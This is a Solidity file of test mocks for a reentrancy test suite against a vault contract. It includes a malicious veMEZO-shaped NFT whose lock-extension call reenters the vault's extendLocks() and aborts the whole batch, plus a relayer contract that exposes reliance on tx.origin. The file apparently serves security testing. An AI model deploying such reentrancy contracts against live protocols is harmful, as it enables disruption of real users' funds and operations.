// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";

// AttackMocks.sol — three helper contracts for the reentrancy test suite.

//1.MaliciousVeMEZO
// veMEZO-shaped ERC721 whose increaseUnlockTime() can reenter ByNdVault.extendLocks()
//• mint() sets a 30-day lock (not MAXTIME) so the vault's
//  `if (lock.end < newEndTime)` condition is always true and
//  increaseUnlockTime() is always called during extendLocks().
// arm(target) makes the next increaseUnlockTime() call vault.extendLocks()
//before doing anything else. The inner call hits the cooldown check
//(lastExtendTimestamp was just written by the outer call), reverts with
//"ByNdVault: cooldown active", and because neither extendLocks() nor
//the loop uses try/catch — that revert bubbles all the way out, killing
//the entire outer batch and rolling back lastExtendTimestamp to 0.

interface IExtendLocksCallback {
    function extendLocks() external;
}

contract MaliciousVeMEZO is ERC721 {
    struct LockedBalance {
        int128 amount;
        uint256 end;
        bool isPermanent;
    }

    mapping(uint256 => LockedBalance) private _locked;
    uint256 private _nextId = 1;

    address public reentryTarget;
    bool    public armed;

    constructor() ERC721("Malicious veMEZO", "mveMEZO") {}

    function arm(address target) external {
        reentryTarget = target;
        armed         = true;
    }

    function mint(address to, uint256 /*tokenId*/) external {
        uint256 id = _nextId++;
        _locked[id] = LockedBalance({
            amount: int128(int256(1000 ether)),
            end: block.timestamp + 30 days,
            isPermanent: false
        });
        _safeMint(to, id);
    }

    function locked(uint256 tokenId) external view returns (LockedBalance memory) {
        return _locked[tokenId];
    }

    function votingPowerOfNFT(uint256 tokenId) external view returns (uint256) {
        LockedBalance memory l = _locked[tokenId];
        if (l.end <= block.timestamp) return 0;
        return uint256(uint128(l.amount));
    }

    function increaseUnlockTime(uint256 tokenId, uint256 newEnd) external {
        if (armed) {
            armed = false;
            IExtendLocksCallback(reentryTarget).extendLocks();
        }
        require(_locked[tokenId].end < newEnd, "MaliciousVeMEZO: new end not later");
        _locked[tokenId].end = newEnd;
    }

    function depositFor(uint256 tokenId, uint256 amount) external {
        _locked[tokenId].amount += int128(int256(amount));
    }
}

//2. RelayerCaller
// Minimal pass-through that models a Gelato job, Chainlink Automation task, or smart-contract wallet routing extendLocks() on behalf of a keeper EOA Used to show that markLocksExtended() records tx.origin, not msg.sender.

interface IExtendable {
    function extendLocks() external;
}

contract RelayerCaller {
    function relayExtendLocks(address vault) external {
        IExtendable(vault).extendLocks();
    }
}

//3. MockRewardsDistributor
// No-op IRewardsDistributor so tests can call ByNdVault.claimRebases() without wiring up real Mezo rebase infrastructure.

contract MockRewardsDistributor {
    function claim(uint256) external pure returns (uint256) { return 0; }
    function claimMany(uint256[] calldata) external pure returns (bool) { return true; }
    function claimable(uint256) external pure returns (uint256) { return 0; }
}